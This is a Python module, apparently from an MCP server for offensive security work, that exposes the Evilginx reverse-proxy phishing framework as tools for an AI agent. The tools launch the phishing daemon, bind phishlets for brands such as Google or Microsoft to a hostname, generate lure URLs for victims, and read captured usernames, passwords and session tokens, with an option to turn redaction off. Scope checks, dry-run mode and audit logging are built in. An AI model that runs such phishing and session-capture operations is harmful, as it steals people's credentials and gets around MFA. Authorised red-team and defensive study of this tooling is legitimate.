"""Evilginx tools.

Evilginx is extremely sensitive — it performs reverse-proxy phishing that
captures session cookies and bypasses MFA. Because the legal risk surface
is high, every offensive action here:

    * requires ``tools.evilginx.enabled=true`` (off by default)
    * requires ``require_scope=true`` on the phishing hostname
    * is blocked by the scope guard unless the phishing domain/subdomain
      is explicitly inside ``authorized_scope``
    * writes audit records containing the tool name + phishlet + hostname

Tools:
    * ``evilginx_start``              spawn evilginx binary (daemon)
    * ``evilginx_stop``               stop it
    * ``evilginx_status``             PID status
    * ``evilginx_list_phishlets``     enumerate bundled phishlets from disk
    * ``evilginx_list_captured_sessions``
                                     read ~/.evilginx/data/ for captured sessions
"""

from __future__ import annotations

import json
import os
import signal
import subprocess
import sys
from pathlib import Path
from typing import Any

import yaml

from ..config import Settings
from ..executor import resolve_binary
from ..logging import audit_event
from ..security import ScopeGuard
from .base import ToolModule, ToolResult, ToolSpec

_PID_FILE_NAME = "evilginx.pid"
_DEFAULT_DATA_DIR = "~/.evilginx"


class EvilginxModule(ToolModule):
    id = "evilginx"

    def __init__(self, settings: Settings, scope_guard: ScopeGuard) -> None:
        super().__init__(settings, scope_guard)
        block = self.settings.tools.evilginx
        self._binary_hint: str | None = getattr(block, "binary", None)
        self._phishlets_dir: str | None = getattr(block, "phishlets_dir", None)
        self._data_dir: str = getattr(block, "config_dir", None) or _DEFAULT_DATA_DIR
        runs_dir = settings.expanded_path(settings.execution.working_dir)
        runs_dir.mkdir(parents=True, exist_ok=True)
        self._pid_file = runs_dir / _PID_FILE_NAME

    def _binary(self) -> str:
        return resolve_binary(self._binary_hint, "evilginx")

    def specs(self) -> list[ToolSpec]:
        return [
            ToolSpec(
                name="evilginx_start",
                description=(
                    "Start evilginx in daemon mode. THIS IS A HIGH-RISK TOOL: it launches "
                    "a reverse-proxy phishing server. The phishing hostname you specify "
                    "MUST be in the authorized engagement scope."
                ),
                input_schema={
                    "type": "object",
                    "required": ["phish_hostname"],
                    "properties": {
                        "phish_hostname": {
                            "type": "string",
                            "description": (
                                "The phishing domain/subdomain the victim will see. "
                                "Must be in authorized_scope."
                            ),
                        },
                        "developer": {
                            "type": "boolean",
                            "default": False,
                            "description": "Run in developer (no TLS) mode for localhost testing.",
                        },
                        "phishlets_dir": {
                            "type": "string",
                            "description": "Override the phishlets directory.",
                        },
                        "redirectors_dir": {"type": "string"},
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_start,
                dangerous=True,
                requires_scope_field="phish_hostname",
                tags=["phishing", "c2"],
            ),
            ToolSpec(
                name="evilginx_stop",
                description="Stop the evilginx daemon launched by this MCP.",
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_stop,
                tags=["phishing"],
            ),
            ToolSpec(
                name="evilginx_status",
                description="Return whether evilginx is currently running.",
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_status,
                tags=["phishing", "meta"],
            ),
            ToolSpec(
                name="evilginx_list_phishlets",
                description=(
                    "Enumerate phishlet YAML files on disk and return each one's target "
                    "brand + host list. Pure read-only introspection — no network."
                ),
                input_schema={
                    "type": "object",
                    "properties": {
                        "phishlets_dir": {"type": "string"},
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_list_phishlets,
                tags=["phishing", "recon"],
            ),
            ToolSpec(
                name="evilginx_enable_phishlet",
                description=(
                    "Enable a phishlet by name and bind it to a phishing hostname. "
                    "This modifies evilginx's config.json and optionally reloads the daemon."
                ),
                input_schema={
                    "type": "object",
                    "required": ["phishlet", "phish_hostname"],
                    "properties": {
                        "phishlet": {
                            "type": "string",
                            "description": "Name of the phishlet to enable (e.g. 'google', 'microsoft').",
                        },
                        "phish_hostname": {
                            "type": "string",
                            "description": "The hostname the phishlet will serve on. Must be in authorized_scope.",
                        },
                        "reload": {
                            "type": "boolean",
                            "default": True,
                            "description": "If true and daemon is running, send SIGHUP to reload config.",
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_enable_phishlet,
                dangerous=True,
                requires_scope_field="phish_hostname",
                tags=["phishing", "config"],
            ),
            ToolSpec(
                name="evilginx_create_lure",
                description=(
                    "Create a lure (phishing URL path) for an enabled phishlet. "
                    "Returns the full lure URL the victim should be sent to."
                ),
                input_schema={
                    "type": "object",
                    "required": ["phishlet", "phish_hostname"],
                    "properties": {
                        "phishlet": {
                            "type": "string",
                            "description": "Name of the enabled phishlet.",
                        },
                        "phish_hostname": {
                            "type": "string",
                            "description": "The phishing hostname. Must be in authorized_scope.",
                        },
                        "path": {
                            "type": "string",
                            "default": "/",
                            "description": "URL path for the lure (e.g. '/login').",
                        },
                        "redirect_url": {
                            "type": "string",
                            "description": "Where to redirect the victim after credential capture.",
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_create_lure,
                dangerous=True,
                requires_scope_field="phish_hostname",
                tags=["phishing", "config"],
            ),
            ToolSpec(
                name="evilginx_list_captured_sessions",
                description=(
                    "Read evilginx's internal data directory and return captured phishing "
                    "sessions (usernames, passwords, captured tokens). Legal warning: "
                    "this data is highly sensitive."
                ),
                input_schema={
                    "type": "object",
                    "properties": {
                        "data_dir": {"type": "string"},
                        "redact": {
                            "type": "boolean",
                            "default": True,
                            "description": "If true, redact passwords and token values.",
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_list_sessions,
                dangerous=True,
                tags=["phishing", "post-capture"],
            ),
        ]

    # -----------------------------------------------------------------------

    async def _handle_start(self, arguments: dict[str, Any]) -> ToolResult:
        host = arguments["phish_hostname"]
        await self.ensure_scope(host, tool_name="evilginx_start")

        if self._pid_file.exists():
            try:
                pid = int(self._pid_file.read_text("utf-8").strip())
                if _alive(pid):
                    return ToolResult.error(f"evilginx already running PID {pid}.")
            except (ValueError, OSError):
                pass

        binary = self._binary()
        argv: list[str] = [binary]
        if arguments.get("developer"):
            argv.append("-developer")
        if phishlets := (arguments.get("phishlets_dir") or self._phishlets_dir):
            argv += ["-p", str(self.settings.expanded_path(phishlets))]
        if redirectors := arguments.get("redirectors_dir"):
            argv += ["-t", str(self.settings.expanded_path(redirectors))]

        if self.settings.security.dry_run:
            return ToolResult(
                text=f"[dry-run] would start: {' '.join(argv)}",
                structured={"dry_run": True, "argv": argv, "phish_hostname": host},
            )

        log_path = self._pid_file.with_suffix(".log")
        try:
            log_fh = log_path.open("ab")
            proc = subprocess.Popen(  # noqa: S603
                argv,
                stdout=log_fh,
                stderr=log_fh,
                stdin=subprocess.DEVNULL,
                cwd=str(Path(binary).parent),
                creationflags=(
                    subprocess.CREATE_NEW_PROCESS_GROUP if sys.platform == "win32" else 0
                ),
            )
        except OSError as exc:
            return ToolResult.error(f"Failed to spawn evilginx: {exc}")

        self._pid_file.write_text(str(proc.pid), encoding="utf-8")
        audit_event(
            self.log,
            "evilginx.start",
            pid=proc.pid,
            phish_hostname=host,
            developer=bool(arguments.get("developer")),
        )
        return ToolResult(
            text=(
                f"evilginx started PID {proc.pid} for phishing host '{host}'. "
                "You must complete the interactive configuration inside evilginx "
                "(config domain <...>, phishlets enable, lures create) before the "
                "lure URL is functional."
            ),
            structured={
                "pid": proc.pid,
                "phish_hostname": host,
                "log_path": str(log_path),
            },
        )

    async def _handle_stop(self, _arguments: dict[str, Any]) -> ToolResult:
        if not self._pid_file.exists():
            return ToolResult(text="evilginx is not running.", structured={"running": False})
        try:
            pid = int(self._pid_file.read_text("utf-8").strip())
        except ValueError:
            self._pid_file.unlink(missing_ok=True)
            return ToolResult.error("PID file malformed, cleaned up.")
        if not _alive(pid):
            self._pid_file.unlink(missing_ok=True)
            return ToolResult(text=f"PID {pid} already exited.", structured={"running": False})
        try:
            if sys.platform == "win32":
                os.kill(pid, signal.CTRL_BREAK_EVENT)
            else:
                os.kill(pid, signal.SIGTERM)
        except OSError as exc:
            return ToolResult.error(f"Failed to stop PID {pid}: {exc}")
        self._pid_file.unlink(missing_ok=True)
        audit_event(self.log, "evilginx.stop", pid=pid)
        return ToolResult(text=f"Stopped evilginx PID {pid}.", structured={"stopped_pid": pid})

    async def _handle_status(self, _arguments: dict[str, Any]) -> ToolResult:
        if not self._pid_file.exists():
            return ToolResult(text="not running", structured={"running": False})
        try:
            pid = int(self._pid_file.read_text("utf-8").strip())
        except ValueError:
            return ToolResult.error("PID file corrupt")
        running = _alive(pid)
        if not running:
            self._pid_file.unlink(missing_ok=True)
        return ToolResult(
            text=f"pid={pid} running={running}", structured={"pid": pid, "running": running}
        )

    async def _handle_list_phishlets(self, arguments: dict[str, Any]) -> ToolResult:
        phishlets_raw = arguments.get("phishlets_dir") or self._phishlets_dir
        if not phishlets_raw:
            return ToolResult.error(
                "No phishlets_dir configured. Set tools.evilginx.phishlets_dir or pass explicitly."
            )
        phishlets_dir = self.settings.expanded_path(phishlets_raw)
        if not phishlets_dir.is_dir():
            return ToolResult.error(f"phishlets_dir {phishlets_dir} does not exist.")

        phishlets: list[dict[str, Any]] = []
        for yaml_file in sorted(phishlets_dir.glob("*.yaml")):
            try:
                data = yaml.safe_load(yaml_file.read_text("utf-8")) or {}
            except yaml.YAMLError as exc:
                phishlets.append({"file": yaml_file.name, "parse_error": str(exc)})
                continue
            if not isinstance(data, dict):
                continue
            phishlets.append(
                {
                    "file": yaml_file.name,
                    "name": data.get("name") or yaml_file.stem,
                    "author": data.get("author"),
                    "min_ver": data.get("min_ver"),
                    "proxy_hosts": [
                        h.get("domain")
                        for h in (data.get("proxy_hosts") or [])
                        if isinstance(h, dict)
                    ],
                    "auth_urls": data.get("auth_urls", []),
                }
            )

        audit_event(self.log, "evilginx.list_phishlets", count=len(phishlets))
        return ToolResult(
            text=f"Found {len(phishlets)} phishlet(s) in {phishlets_dir}.",
            structured={"directory": str(phishlets_dir), "phishlets": phishlets},
        )

    async def _handle_enable_phishlet(self, arguments: dict[str, Any]) -> ToolResult:
        phishlet = arguments["phishlet"]
        host = arguments["phish_hostname"]
        await self.ensure_scope(host, tool_name="evilginx_enable_phishlet")

        data_dir = self.settings.expanded_path(self._data_dir)
        data_dir.mkdir(parents=True, exist_ok=True)
        config_path = data_dir / "config.json"

        config: dict[str, Any] = {}
        if config_path.exists():
            try:
                config = json.loads(config_path.read_text("utf-8")) or {}
            except json.JSONDecodeError:
                pass

        if not isinstance(config, dict):
            config = {}

        phishlets_cfg = config.setdefault("phishlets", {})
        if not isinstance(phishlets_cfg, dict):
            phishlets_cfg = {}
            config["phishlets"] = phishlets_cfg

        enabled = phishlets_cfg.setdefault("enabled", [])
        if not isinstance(enabled, list):
            enabled = []
            phishlets_cfg["enabled"] = enabled

        if phishlet not in enabled:
            enabled.append(phishlet)

        phishlets_cfg[phishlet] = {
            "hostname": host,
            "enabled": True,
        }

        if self.settings.security.dry_run:
            return ToolResult(
                text=f"[dry-run] would enable phishlet '{phishlet}' on host '{host}'.",
                structured={"dry_run": True, "phishlet": phishlet, "host": host},
            )

        config_path.write_text(json.dumps(config, indent=2), encoding="utf-8")
        audit_event(self.log, "evilginx.enable_phishlet", phishlet=phishlet, host=host)

        reloaded = False
        if arguments.get("reload", True) and self._pid_file.exists():
            try:
                pid = int(self._pid_file.read_text("utf-8").strip())
                if _alive(pid):
                    if sys.platform == "win32":
                        os.kill(pid, signal.CTRL_BREAK_EVENT)
                    else:
                        os.kill(pid, signal.SIGHUP)
                    reloaded = True
            except (ValueError, OSError):
                pass

        return ToolResult(
            text=(
                f"Phishlet '{phishlet}' enabled on '{host}'. "
                f"Config written to {config_path}. "
                f"{'Daemon reloaded.' if reloaded else 'Reload skipped (daemon not running).'}"
            ),
            structured={"phishlet": phishlet, "host": host, "reloaded": reloaded},
        )

    async def _handle_create_lure(self, arguments: dict[str, Any]) -> ToolResult:
        phishlet = arguments["phishlet"]
        host = arguments["phish_hostname"]
        path = arguments.get("path", "/")
        redirect_url = arguments.get("redirect_url", "")
        await self.ensure_scope(host, tool_name="evilginx_create_lure")

        data_dir = self.settings.expanded_path(self._data_dir)
        config_path = data_dir / "config.json"

        if not config_path.exists():
            return ToolResult.error(
                "Evilginx config.json not found. Run evilginx_start or evilginx_enable_phishlet first."
            )

        try:
            config = json.loads(config_path.read_text("utf-8")) or {}
        except json.JSONDecodeError as exc:
            return ToolResult.error(f"Failed to parse config.json: {exc}")

        if not isinstance(config, dict):
            return ToolResult.error("config.json is malformed.")

        phishlets_cfg = config.get("phishlets", {})
        enabled = phishlets_cfg.get("enabled", [])
        if phishlet not in enabled:
            return ToolResult.error(
                f"Phishlet '{phishlet}' is not enabled. Call evilginx_enable_phishlet first."
            )

        lures_cfg = config.setdefault("lures", {})
        if not isinstance(lures_cfg, dict):
            lures_cfg = {}
            config["lures"] = lures_cfg

        phishlet_lures = lures_cfg.setdefault(phishlet, [])
        if not isinstance(phishlet_lures, list):
            phishlet_lures = []
            lures_cfg[phishlet] = phishlet_lures

        lure_id = len(phishlet_lures)
        lure = {
            "id": lure_id,
            "path": path,
            "redirect_url": redirect_url,
        }
        phishlet_lures.append(lure)

        if self.settings.security.dry_run:
            return ToolResult(
                text=f"[dry-run] would create lure id={lure_id} for '{phishlet}' on '{host}{path}'.",
                structured={"dry_run": True, "phishlet": phishlet, "lure_id": lure_id, "url": f"https://{host}{path}"},
            )

        config_path.write_text(json.dumps(config, indent=2), encoding="utf-8")
        audit_event(
            self.log,
            "evilginx.create_lure",
            phishlet=phishlet,
            host=host,
            path=path,
            lure_id=lure_id,
        )

        lure_url = f"https://{host}{path}"
        return ToolResult(
            text=f"Lure #{lure_id} created for phishlet '{phishlet}': {lure_url}",
            structured={
                "phishlet": phishlet,
                "lure_id": lure_id,
                "url": lure_url,
                "redirect_url": redirect_url,
            },
        )

    async def _handle_list_sessions(self, arguments: dict[str, Any]) -> ToolResult:
        data_raw = arguments.get("data_dir") or self._data_dir
        data_dir = self.settings.expanded_path(data_raw)
        if not data_dir.exists():
            return ToolResult.error(f"Evilginx data dir {data_dir} does not exist.")
        redact = bool(arguments.get("redact", True))

        session_candidates: list[Path] = []
        for sub in ("data.db", "data"):
            candidate = data_dir / sub
            if candidate.exists():
                session_candidates.append(candidate)
        for p in data_dir.rglob("*.json"):
            session_candidates.append(p)

        parsed: list[dict[str, Any]] = []
        for p in session_candidates:
            if not p.is_file() or p.suffix != ".json":
                continue
            try:
                raw = json.loads(p.read_text("utf-8"))
            except (OSError, json.JSONDecodeError):
                continue
            if isinstance(raw, dict) and "sessions" in raw:
                sessions_list = raw["sessions"]
            elif isinstance(raw, list):
                sessions_list = raw
            else:
                continue
            for s in sessions_list:
                if not isinstance(s, dict):
                    continue
                entry = {
                    "phishlet": s.get("phishlet"),
                    "username": s.get("username"),
                    "landing_url": s.get("landing_url"),
                    "remote_addr": s.get("remote_addr"),
                    "user_agent": (s.get("useragent") or s.get("user_agent") or "")[:200],
                    "captured_at": s.get("update_time") or s.get("create_time"),
                    "tokens_present": bool(s.get("tokens") or s.get("cookies")),
                    "source_file": str(p),
                }
                if not redact:
                    entry["password"] = s.get("password")
                    entry["tokens"] = s.get("tokens") or s.get("cookies")
                parsed.append(entry)

        audit_event(
            self.log,
            "evilginx.list_sessions",
            count=len(parsed),
            redact=redact,
        )
        return ToolResult(
            text=f"{len(parsed)} captured session(s).",
            structured={"count": len(parsed), "sessions": parsed, "redact": redact},
        )


def _alive(pid: int) -> bool:
    if sys.platform == "win32":
        try:
            output = subprocess.check_output(  # noqa: S603,S607
                ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
                text=True,
                stderr=subprocess.DEVNULL,
            )
            return str(pid) in output
        except (OSError, subprocess.SubprocessError):
            return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False
